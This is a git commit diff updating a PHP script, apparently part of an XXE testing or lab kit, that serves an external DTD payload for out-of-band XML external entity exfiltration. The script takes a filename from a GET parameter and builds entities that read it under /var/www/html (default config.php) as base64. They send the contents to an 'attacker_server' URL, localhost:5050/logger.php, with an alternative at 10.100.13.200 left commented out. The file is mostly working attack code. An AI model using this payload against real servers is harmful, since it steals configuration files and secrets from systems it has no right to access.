dabc71cc1abe02d7a5a4c5cb6a5f9eee464c2832
Saket Pandey <theunknownsoul.011@gmail.com>
2025-07-21 00:18:49 +0530

    Update fuzzer_payload.php

--- XXE-PHP/dtd-serve/fuzzer_payload.php
+++ XXE-PHP/dtd-serve/fuzzer_payload.php
@@ -1,17 +1,22 @@
 <?php
   # Simple proxy script to echo custom XML payloads
-  $file_name = "config.php"; # default
+  $file_name = "config.php";  # default
   if(! empty($_GET['file_name']))
-    $file_name = $_GET['file_name'];
+     $file_name = $_GET['file_name'];
+  
+  # method 1: only send the content of the file
+  # $attacker_server = "http://10.100.13.200:5050/?data=";
+  
   # method 2: passing the file name
   # ? is bad char therefore use ___ as marker
-  # in the server side code, need to parse the fname and data parameter from the
-  request url
-  $attacker_server = "http://localhost:5000/?fname=" .
-  urlencode($file_name) . "___data=";
+  # in the server side code, need to parse the fname and data parameter from the request url
+  $attacker_server = "http://localhost:5050/logger.php?fname=" . urlencode($file_name) . "___data=";
   header('Content-Type: text/xml');
+  
   echo <<<XML
   <!ENTITY % resource SYSTEM 'php://filter/read=convert.base64-encode/resource=file:///var/www/html/$file_name'>
   <!ENTITY % LoadOOBEnt '<!ENTITY &#x25; OOB SYSTEM "$attacker_server%resource;">'>
   XML;
 ?>
+
+
